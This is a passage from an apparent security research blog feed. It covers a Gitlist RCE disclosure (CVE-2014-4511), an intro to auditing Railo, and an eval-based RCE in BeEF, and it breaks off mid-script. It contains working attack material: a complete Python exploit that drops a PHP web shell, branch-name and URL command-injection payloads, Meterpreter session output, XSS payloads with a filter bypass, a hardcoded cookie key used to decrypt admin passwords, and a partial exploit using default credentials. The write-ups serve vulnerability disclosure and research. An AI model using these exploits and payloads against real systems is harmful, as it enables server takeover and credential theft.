<p>The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of <a href="https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c">refs.c</a>, and the rules are simply defined as (starting at line 33):</p>

<ol>
<li>Cannot begin with .</li>
<li>Cannot have a double dot (..)</li>
<li>Cannot contain ASCII control characters (?, [, ], ~, ^, :, \)</li>
<li>End with /</li>
<li>End with .lock</li>
<li>Contain a backslash</li>
<li>Cannot contain a space</li>
</ol>


<p>With these restrictions in mind, we can begin crafting our payload.</p>

<p>My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /var/www/gitlist
</span><span class='line'>mkdir cache
</span><span class='line'>chmod 777 cache</span></code></pre></td></tr></table></div></figure>


<p>This is perfect; we have a <em>reliable</em> location with 777 permissions and it&rsquo;s accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># git checkout -b "|echo\$IFS\"PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\"|base64\$IFS-d&gt;/var/www/gitlist/cache/x"</span></code></pre></td></tr></table></div></figure>


<p>In order to inject PHP, we need the &lt;? and ?> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64&rsquo;d shell into <code>base64</code> for decoding, then pipe that into our payload location.</p>

<p>And it works flawlessly.</p>

<p>Though you might say, &ldquo;Hey if you have commit access it&rsquo;s game over&rdquo;, but I&rsquo;ve seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.</p>

<p>The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$blames = $repository-&gt;getBlame("$branch -- \"$file\"");</span></code></pre></td></tr></table></div></figure>


<p>Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/gitlist/my_repo.git/blame/master/""`whoami`</span></code></pre></td></tr></table></div></figure>


<p>And what do you know?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce1.jpg"></p>

<p>Curiousity quickly overcame me, and I attempted another vector:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce2.jpg"></p>

<p>Faster my fingers flew:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce3.jpg"></p>

<p>It&rsquo;s terrifyingly clear that <em>everything</em> is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
</span><span class='line'>[!] Using cache location /var/www/gitlist/cache
</span><span class='line'>[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
</span><span class='line'>root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>root@droot:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve also developed a Metasploit module for this issue, which I&rsquo;ll be submitting a PR for soon.  A run of it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(gitlist_rce) &gt; rexploit
</span><span class='line'>[*] Reloading module...
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.1.6:4444 
</span><span class='line'>[*] Injecting payload...
</span><span class='line'>[*] Executing payload..
</span><span class='line'>[*] Sending stage (39848 bytes) to 192.168.1.67
</span><span class='line'>[*] Meterpreter session 9 opened (192.168.1.6:4444 -&gt; 192.168.1.67:34241) at 2014-06-21 23:07:01 -0600
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer    : bryan-VirtualBox
</span><span class='line'>OS          : Linux bryan-VirtualBox 3.2.0-63-generic #95-Ubuntu SMP Thu May 15 23:06:36 UTC 2014 i686
</span><span class='line'>Meterpreter : php/php
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>Source for the standalone Python exploit can be found below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from commands import getoutput
</span><span class='line'>import urllib
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>""" 
</span><span class='line'>Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE
</span><span class='line'>Date: 06/20/2014
</span><span class='line'>Author: drone (@dronesec)
</span><span class='line'>Vendor Homepage: http://gitlist.org/
</span><span class='line'>Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
</span><span class='line'>Version: &lt;= 0.4.0
</span><span class='line'>Tested on: Debian 7
</span><span class='line'>More information: 
</span><span class='line'>cve: CVE-2014-4511
</span><span class='line'>"""
</span><span class='line'>
</span><span class='line'>if len(sys.argv) &lt;= 1:
</span><span class='line'>    print '%s: [url to git repo] {cache path}' % sys.argv[0]
</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
</span><span class='line'>    sys.exit(1)
</span><span class='line'>
</span><span class='line'>url = sys.argv[1]
</span><span class='line'>url = url if url[-1] != '/' else url[:-1]
</span><span class='line'>
</span><span class='line'>path = "/var/www/gitlist/cache"
</span><span class='line'>if len(sys.argv) &gt; 2:
</span><span class='line'>    path = sys.argv[2]
</span><span class='line'>
</span><span class='line'>print '[!] Using cache location %s' % path
</span><span class='line'>
</span><span class='line'># payload &lt;?system($_GET['cmd']);?&gt;
</span><span class='line'>payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="
</span><span class='line'>
</span><span class='line'># sploit; python requests does not like this URL, hence wget is used
</span><span class='line'>mpath = '/blame/master/""`echo {0}|base64 -d &gt; {1}/x.php`'.format(payload, path)
</span><span class='line'>mpath = url+ urllib.quote(mpath)
</span><span class='line'>
</span><span class='line'>out = getoutput("wget %s" % mpath)
</span><span class='line'>if '500' in out:
</span><span class='line'>    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
</span><span class='line'>else:
</span><span class='line'>    print '[-] Failed to drop'
</span><span class='line'>    print out</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part one - intro]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/"/>
    <updated>2014-06-25T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one</id>
    <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>

<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ git branch
</span><span class='line'>* master
</span><span class='line'>$ git rev-parse master
</span><span class='line'>694e8acf1a762431eab084da762a0abbe5290f49</span></code></pre></td></tr></table></div></figure>


<p>And a quick rundown of the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cloc ./
</span><span class='line'>    3689 text files.
</span><span class='line'>    3571 unique files.                                          
</span><span class='line'>     151 files ignored.
</span><span class='line'>
</span><span class='line'>http://cloc.sourceforge.net v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>Language                       files          blank        comment           code
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>Java                            2786          66639          69647         258015
</span><span class='line'>ColdFusion                       315           5690           3089          35890
</span><span class='line'>ColdFusion CFScript              352           4377            643          15856
</span><span class='line'>XML                               22            526            563           5773
</span><span class='line'>Javascript                        14             46            252            733
</span><span class='line'>Ant                                4             38             70            176
</span><span class='line'>DTD                                4            283            588            131
</span><span class='line'>CSS                                5             52             16             77
</span><span class='line'>HTML                               1              0              0              1
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>SUM:                            3503          77651          74868         316652
</span><span class='line'>---------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>

<h4>Authentication</h4>

<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause&gt;
</span><span class='line'>        &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
</span><span class='line'>    &lt;cfelse&gt;</span></code></pre></td></tr></table></div></figure>


<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64&#8217;ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>

<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')&gt;
</span><span class='line'>    &lt;cfset fromCookie=true&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cfset session["password"&ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
</span><span class='line'>        &lt;cfcatch&gt;&lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
</span><span class='line'>&lt;cfdump var="#tmp#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>

<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset session["password"&request.adminType]=form["login_password"&request.adminType]&gt;</span></code></pre></td></tr></table></div></figure>


<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfdump var="#session#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>We then set the template handler to this file:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-error-handler.jpg"></p>

<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-session-plaintext.jpg"></p>

<h4>XSS</h4>

<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss.jpg"></p>

<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>

<p>Post-authentication search:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss2.jpg"></p>

<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>

<p>How about stored XSS?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss3.jpg"></p>

<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>

<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  public static final String[] invalids=new String[]{
</span><span class='line'>        "object", "embed", "script", "applet", "meta", "iframe"
</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>


<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(compareTagName(tagName)) {
</span><span class='line'>            if(sb==null) {
</span><span class='line'>                sb=new StringBuffer();
</span><span class='line'>                last=0;
</span><span class='line'>            }
</span><span class='line'>            sb.append(str.substring(last,index+1));
</span><span class='line'>            sb.append("invalidTag");
</span><span class='line'>            last=endIndex;
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>

<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-server-pw.jpg"></p>

<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>

<h4>Deploying</h4>

<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer task --usr-auth default
</span><span class='line'>
</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
</span><span class='line'> [2014-05-01 10:04PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-01 10:04PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server...
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator...
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator...
</span><span class='line'> [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-01 10:04PM]   Railo Server (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting completed.
</span><span class='line'> [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] &gt; 
</span><span class='line'> [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
</span><span class='line'> [2014-05-01 10:04PM] Creating scheduled task...
</span><span class='line'> [2014-05-01 10:04PM] Task cmd.cfml created, invoking...
</span><span class='line'> [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
</span><span class='line'> [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
</span><span class='line'> [2014-05-01 10:04PM] Cleaning up...
</span><span class='line'> [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM</span></code></pre></td></tr></table></div></figure>


<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>

<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>

<p>Railo allows extensions to be uploaded directly to the server, found here:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-plugin-upload.jpg"></p>

<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>

<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
    <link href="http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/"/>
    <updated>2014-05-13T19:57:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef</id>
    <content type="html"><![CDATA[<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>

<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>

<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Adds a new DNS rule
</span><span class='line'>        post '/rule' do
</span><span class='line'>          begin
</span><span class='line'>            body = JSON.parse(request.body.read)
</span><span class='line'>
</span><span class='line'>            pattern = body['pattern']
</span><span class='line'>            type = body['type']
</span><span class='line'>            response = body['response']
</span><span class='line'>
</span><span class='line'>            # Validate required JSON keys
</span><span class='line'>            unless [pattern, type, response].include?(nil)
</span><span class='line'>              # Determine whether 'pattern' is a String or Regexp
</span><span class='line'>              begin
</span><span class='line'>
</span><span class='line'>                pattern_test = eval pattern
</span><span class='line'>                pattern = pattern_test if pattern_test.class == Regexp
</span><span class='line'>   #             end
</span><span class='line'>              rescue =&gt; e;
</span><span class='line'>              end</span></code></pre></td></tr></table></div></figure>


<p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>import json
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>def fetch_default(ip):
</span><span class='line'>    url = 'http://%s:3000/api/admin/login' % ip
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'username' : 'beef', 'password' : 'beef' }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    if response.status_code is 200 and json.loads(response.content)['success']:
</span><span class='line'>        return json.loads(response.content)['token']
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    ip = '192.168.1.6'
</span><span class='line'>
</span><span class='line'>    if len(sys.argv) &gt; 1:
</span><span class='line'>        token = sys.argv[1]
</span><span class='line'>    else:
</span><span class='line'>        token = fetch_default(ip)
</span><span class='line'>
</span><span class='line'>    if not token:
